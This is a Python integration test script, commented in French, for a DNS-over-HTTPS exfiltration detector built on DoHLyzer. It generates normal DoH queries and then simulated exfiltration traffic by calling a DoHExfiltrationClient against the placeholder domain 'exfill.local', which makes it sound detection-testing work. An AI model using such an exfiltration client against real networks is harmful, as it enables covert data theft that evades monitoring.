#!/usr/bin/env python3
"""
Test Script pour ML Analyzer

Script pour tester la couche d'analyse ML avec DoHLyzer
"""

import os
import sys
import time
import logging
import requests
import subprocess
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def test_ml_analyzer_integration():
    """Test intégral de la couche ML analyzer"""
    
    logger.info("🧪 Test d'intégration ML Analyzer")
    
    # 1. Vérifier que les services sont up
    logger.info("1️⃣ Vérification des services...")
    
    # 2. Générer du trafic de test
    logger.info("2️⃣ Génération de trafic de test...")
    generate_test_traffic()
    
    # 3. Attendre l'analyse
    logger.info("3️⃣ Attente de l'analyse DoHLyzer...")
    time.sleep(60)  # Laisser le temps à DoHLyzer d'analyser
    
    # 4. Vérifier les résultats
    logger.info("4️⃣ Vérification des résultats...")
    check_analysis_results()
    
    logger.info("✅ Test d'intégration terminé")

def generate_test_traffic():
    """Génère du trafic de test pour l'analyse"""
    try:
        # Trafic normal
        logger.info("📡 Génération de trafic normal...")
        for i in range(10):
            try:
                requests.get("https://doh.local/dns-query", 
                           params={"name": f"test{i}.example.com", "type": "A"},
                           timeout=5, verify=False)
            except:
                pass  # Ignorer les erreurs
            time.sleep(1)
        
        # Trafic d'exfiltration (simulé)
        logger.info("🎯 Génération de trafic d'exfiltration...")
        try:
            from client import DoHExfiltrationClient, ExfiltrationConfig
            
            config = ExfiltrationConfig(
                doh_server="https://doh.local/dns-query",
                target_domain="exfill.local",
                chunk_size=25,
                base_delay=0.5
            )
            
            client = DoHExfiltrationClient(config)
            test_data = b"ML test data for analysis and detection"
            client.exfiltrate_data(test_data, "ml_test")
        except ImportError:
            logger.warning("Client d'exfiltration non disponible")
        
    except Exception as e:
        logger.error(f"❌ Erreur génération trafic: {e}")

def check_analysis_results():
    """Vérifie que l'analyse ML a produit des résultats"""
    analysis_dir = Path("/app/analysis")
    
    if not analysis_dir.exists():
        logger.warning("⚠️ Répertoire d'analyse non trouvé")
        return
    
    # Vérifier les fichiers DoHLyzer
    dohlyzer_dir = analysis_dir / "raw_dohlyzer"
    if dohlyzer_dir.exists():
        dohlyzer_files = list(dohlyzer_dir.glob("*.json"))
        logger.info(f"📊 Fichiers DoHLyzer générés: {len(dohlyzer_files)}")
    
    # Vérifier les CSVs ML
    csv_dir = analysis_dir / "ml_ready_csv"
    if csv_dir.exists():
        csv_files = list(csv_dir.glob("*.csv"))
        logger.info(f"📊 Fichiers CSV ML générés: {len(csv_files)}")
    
    # Vérifier les prédictions
    pred_dir = analysis_dir / "predictions"
    if pred_dir.exists():
        prediction_files = list(pred_dir.glob("*.csv"))
        logger.info(f"🤖 Fichiers de prédictions: {len(prediction_files)}")
        
        # Vérifier les alertes
        alert_files = list(pred_dir.glob("alert_*.json"))
        logger.info(f"🚨 Alertes générées: {len(alert_files)}")
    
    # Résumé
    if csv_dir.exists() and list(csv_dir.glob("*.csv")):
        logger.info("✅ Analyse ML fonctionnelle")
    else:
        logger.warning("⚠️ Aucun fichier CSV ML généré")

if __name__ == "__main__":
    test_ml_analyzer_integration()
